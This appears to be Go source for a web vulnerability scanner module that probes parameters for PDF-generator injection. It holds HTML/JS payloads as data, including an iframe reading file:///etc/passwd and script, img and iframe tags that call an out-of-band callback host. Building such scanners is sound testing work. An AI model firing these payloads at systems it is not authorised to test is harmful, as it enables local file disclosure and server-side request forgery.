package pdf_generation_injection

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
	"github.com/vigolium/vigolium/pkg/utils"
)

// pdfParamNames are parameter name substrings that suggest content/HTML input
// likely consumed by a server-side PDF generator.
var pdfParamNames = []string{
	"content", "html", "body", "text", "template", "data", "page", "url",
	"source", "input", "document", "report", "invoice", "receipt", "pdf",
	"print", "render", "export", "generate", "convert", "title",
	"description", "name", "comment", "message", "note",
}

// reflectionPayload defines an HTML/JS injection payload and the marker to
// search for in the response. A zero-value sev/conf inherits the module
// defaults (High/Firm); set them to override per variant.
type reflectionPayload struct {
	payload string
	marker  string
	name    string
	sev     severity.Severity
	conf    severity.Confidence
	kind    output.RecordKind
	grade   output.EvidenceGrade
}

func newReflectionPayloads() []reflectionPayload {
	suffix := utils.RandomString(12)
	return []reflectionPayload{
		// The exact marker is absent from the payload: the HTML entity must be
		// decoded by a renderer before VIGOLIUM_PDF_RENDER_* can appear.
		{
			payload: `<h1>VIGOLIUM_&#80;DF_RENDER_` + suffix + `</h1>`,
			marker:  "VIGOLIUM_PDF_RENDER_" + suffix,
			name:    "html-rendering",
			sev:     severity.Medium,
			conf:    severity.Firm,
			kind:    output.RecordKindCandidate,
			grade:   output.EvidenceGradeCandidate,
		},
		// Concatenation keeps the exact marker out of the source. Seeing the
		// joined value in the PDF therefore requires JavaScript execution.
		{
			payload: `<script>document.write('VIGOLIUM_PDF_'+'EXEC_` + suffix + `')</script>`,
			marker:  "VIGOLIUM_PDF_EXEC_" + suffix,
			name:    "js-execution",
			sev:     severity.High,
			conf:    severity.Firm,
			kind:    output.RecordKindFinding,
			grade:   output.EvidenceGradeImpact,
		},
		// A PDF response alone never proves file access. The finding is emitted
		// only if recognizable /etc/passwd contents are present in the result.
		{
			payload: `<iframe src="file:///etc/passwd"></iframe>`,
			marker:  "root:x:0:0:",
			name:    "local-file-read",
			sev:     severity.High,
			conf:    severity.Certain,
			kind:    output.RecordKindFinding,
			grade:   output.EvidenceGradeImpact,
		},
	}
}

// oastPayloadTemplates define HTML tags that trigger outbound connections.
// The %s placeholder is replaced with the OAST URL.
var oastPayloadTemplates = []struct {
	tmpl string
	name string
}{
	{`<img src="http://%s/pdf-ssrf">`, "oast-img"},
	{`<script>fetch('http://%s/pdf-ssrf')</script>`, "oast-script"},
	{`<link rel="stylesheet" href="http://%s/pdf-ssrf">`, "oast-link"},
	{`<iframe src="http://%s/pdf-ssrf"></iframe>`, "oast-iframe"},
}

// Module implements the PDF generation injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new PDF Generation Injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		rhm: dedup.LazyDefaultRHM("pdf_generation_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ScanPerInsertionPoint tests a single insertion point for PDF generation injection.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Only test parameters whose name suggests content/HTML input
	if !isPDFRelatedParam(ip.Name()) {
		return nil, nil
	}

	// Dedup by request hash + param via RHM
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	var results []*output.ResultEvent
	baselineBody := baselineResponseBody(ctx, httpClient, scanCtx)

	// --- Strategy 1: Reflection-based (no OAST needed) ---
	for _, rp := range newReflectionPayloads() {
		fuzzedRaw := ip.BuildRequest([]byte(rp.payload))

		// BuildRequest/SetMethod/... produce well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		body := resp.Body().String()
		fullResp := resp.FullResponseString()
		verdict := classifyReflection(rp, baselineBody, body, fullResp)
		if verdict.hit {
			event := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(fuzzedRaw),
				Response:         fullResp,
				FuzzingParameter: ip.Name(),
				ExtractedResults: []string{rp.payload, verdict.detail},
				RecordKind:       rp.kind,
				EvidenceGrade:    rp.grade,
				Info: output.Info{
					Name:        fmt.Sprintf("PDF Generation Injection: %s", rp.name),
					Description: fmt.Sprintf("Injected %q into parameter %q — %s", rp.payload, ip.Name(), verdict.detail),
					Severity:    rp.sev,
					Confidence:  rp.conf,
				},
			}
			resp.Close()
			if rp.kind == output.RecordKindFinding {
				return []*output.ResultEvent{event}, nil
			}
			results = append(results, event)
			continue
		}
		resp.Close()
	}

	// --- Strategy 2: OAST-based (if OAST provider available) ---
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return results, nil
	}

	requestHash := ctx.Request().ID()

	for _, ot := range oastPayloadTemplates {
		oastURL := oast.GenerateURL(urlx.String(), ip.Name(), "parameter", ModuleID, requestHash)
		if oastURL == "" {
			continue
		}

		payload := fmt.Sprintf(ot.tmpl, oastURL)
		oast.RecordPayload(oastURL, payload)
		fuzzedRaw := ip.BuildRequest([]byte(payload))

		// BuildRequest/SetMethod/... produce well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		resp.Close()
	}

	// OAST results arrive asynchronously via polling callbacks
	return results, nil
}

type reflectionVerdict struct {
	detail string
	hit    bool
}

// classifyReflection accepts only post-processing evidence from a PDF. Raw
// reflection is intentionally neutral: the exact marker is absent from each
// HTML/JS probe, so simple echoing cannot satisfy the oracle. A baseline marker
// also suppresses the hit to avoid attributing pre-existing content to the
// payload.
func classifyReflection(
	rp reflectionPayload,
	baselineBody, body, fullResp string,
) reflectionVerdict {
	isPDF := isPDFResponse(body, fullResp)
	if !isPDF || rp.marker == "" || strings.Contains(baselineBody, rp.marker) || !strings.Contains(body, rp.marker) {
		return reflectionVerdict{}
	}
	return reflectionVerdict{
		detail: fmt.Sprintf("%s produced post-processing marker %q in a PDF response", rp.name, rp.marker),
		hit:    true,
	}
}

func baselineResponseBody(ctx *httpmsg.HttpRequestResponse, client *http.Requester, scanCtx *modkit.ScanContext) string {
	if ctx.HasResponse() {
		return ctx.Response().BodyToString()
	}
	if scanCtx == nil {
		return ""
	}
	entry, err := scanCtx.GetOrFetchBaseline(ctx, client)
	if err != nil || entry == nil || entry.Response == nil {
		return ""
	}
	return string(entry.Response.Body())
}

// isPDFRelatedParam checks if a parameter name suggests content/HTML input
// that might be consumed by a PDF generator.
func isPDFRelatedParam(name string) bool {
	nameLower := strings.ToLower(name)
	for _, p := range pdfParamNames {
		if strings.Contains(nameLower, p) {
			return true
		}
	}
	return false
}

// isPDFResponse checks if the response looks like a PDF document based on
// content type or magic bytes.
func isPDFResponse(body, fullResponse string) bool {
	if strings.HasPrefix(body, "%PDF") {
		return true
	}
	respLower := strings.ToLower(fullResponse)
	if strings.Contains(respLower, "application/pdf") {
		return true
	}
	if strings.Contains(respLower, "content-type: pdf") {
		return true
	}
	return false
}
